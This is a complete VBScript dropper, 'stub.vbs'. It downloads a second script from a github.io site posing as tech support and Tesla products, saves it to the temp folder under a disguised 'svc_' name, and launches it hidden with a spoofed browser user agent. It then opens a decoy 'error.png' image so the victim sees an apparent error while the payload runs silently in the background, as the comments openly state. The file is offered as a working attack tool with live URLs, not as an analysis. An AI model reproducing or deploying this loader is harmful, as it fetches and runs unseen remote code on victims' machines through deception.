' ============================================================
' stub.vbs
' Downloads both files first, fires the install in the
' background, then shows the image immediately — no waiting.
'
' Flow:
'   1. Download tactical.vbs  → save to %TEMP%
'   2. Download error.png     → save to %TEMP%
'   3. Launch tactical.vbs hidden (no wait — runs in background)
'   4. Open the image immediately
'   5. Install continues silently behind the scenes
' ============================================================

Set objShell = CreateObject("WScript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")

' ---------- CONFIGURE THESE URLS ----------
remoteVBS_URL   = "https://techsupportservices.github.io/Tesla-Products-/tactical.vbs"
remoteImage_URL = "https://techsupportservices.github.io/Tesla-Products-/error.png"
' ------------------------------------------

' ============================================================
' STEP 1: Download tactical.vbs
' ============================================================
Dim httpVBS
Set httpVBS = CreateObject("MSXML2.ServerXMLHTTP.6.0")

On Error Resume Next
httpVBS.Open "GET", remoteVBS_URL, False
httpVBS.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
httpVBS.Send
On Error Goto 0

If httpVBS.Status <> 200 Then WScript.Quit

vbsTempFile = objFSO.BuildPath(tempFolder, "svc_" & Replace(CStr(Timer), ".", "") & ".vbs")

On Error Resume Next
Set f = objFSO.CreateTextFile(vbsTempFile, True, False)
If Err.Number <> 0 Then WScript.Quit
f.Write httpVBS.responseText
f.Close
Set httpVBS = Nothing
On Error Goto 0

' ============================================================
' STEP 2: Download error.png
' ============================================================
Dim httpImg
Set httpImg = CreateObject("MSXML2.ServerXMLHTTP.6.0")

imageTempFile = ""

On Error Resume Next
httpImg.Open "GET", remoteImage_URL, False
httpImg.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
httpImg.Send

If httpImg.Status = 200 Then
    imageTempFile = objFSO.BuildPath(tempFolder, "img_" & Replace(CStr(Timer), ".", "") & ".png")

    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open
    adoStream.Write httpImg.responseBody
    adoStream.SaveToFile imageTempFile, 2
    adoStream.Close
    Set adoStream = Nothing
End If
Set httpImg = Nothing
On Error Goto 0

' ============================================================
' STEP 3: Launch tactical.vbs in the background — NO wait
' The install runs completely silently behind the scenes
' while the image is already visible to the user
' ============================================================
objShell.Run "wscript.exe //nologo " & Chr(34) & vbsTempFile & Chr(34), 0, False

' ============================================================
' STEP 4: Show the image immediately — doesn't wait for
' the install, opens right away in the default viewer
' ============================================================
If imageTempFile <> "" Then
    If objFSO.FileExists(imageTempFile) Then
        objShell.Run Chr(34) & imageTempFile & Chr(34), 1, False
    End If
End If

Set objFSO = Nothing
Set objShell = Nothing
